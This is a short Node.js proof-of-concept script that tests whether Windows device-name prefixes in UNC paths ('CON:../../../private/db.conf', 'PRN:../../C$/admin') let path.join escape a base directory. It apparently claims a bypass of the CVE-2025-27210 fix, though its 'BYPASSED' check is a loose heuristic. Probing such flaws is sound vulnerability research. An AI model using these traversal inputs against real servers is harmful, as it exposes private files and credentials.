const path = require("path")

console.log("Node.js UNC Path Device Name Bypass PoC");
console.log("Version:", process.version);
console.log("Date:", new Date().toISOString());
console.log("");

console.log("[1] CVE-2025-27210 Fixed for regular paths:");
console.log("  path.normalize(\"CON:../../secret.txt\")");
console.log("  Result:", path.normalize("CON:../../secret.txt"));
console.log("  SAFE - Device name prefixed");
console.log("");

console.log("[2] UNC paths with path.join() - STILL VULNERABLE:");

function testExploit(testName, base, input, expectedSafe) {
  const result = path.join(base, input);
  const baseDepth = base.split("\\\\").length;
  const resultDepth = result.split("\\\\").length;
  const escaped = result.indexOf(base.split("\\\\").pop()) === -1;

  console.log(`\n[${testName}]`);
  console.log("  Base Path:", base);
  console.log("  Malicious Input:", input);
  console.log("  Result Path:", result);
  console.log("  Expected Safe:", expectedSafe);
  console.log("  Actual Result:", result);
  console.log("  BYPASSED:", escaped || !result.startsWith(base.substring(0,10)) ? "YES" : "NO");
}

testExploit("Test 1", "\\\\fileserver\\\\public\\\\uploads", "CON:../../../private/db.conf", "\\\\fileserver\\\\public\\\\uploads\\\\.\\\\CON:..\\\\..\\\\..\\\\private\\\\db.conf");
testExploit("Test 2", "\\\\webapp\\\\data", "PRN:../../C$/admin", "\\\\webapp\\\\data\\\\.\\\\PRN:..\\\\..\\\\C$\\\\admin");
testExploit("Test 3", "\\\\nas\\\\share", "AUX:../secret", "\\\\nas\\\\share\\\\.\\\\AUX:..\\\\secret");

console.log("\n[!] All device names allow path traversal in UNC paths!");
console.log("[!] This bypasses CVE-2025-27210 protection!");

console.log('Path.join')
console.log(path.join('/home/rafaelgss/', '../tmp'))
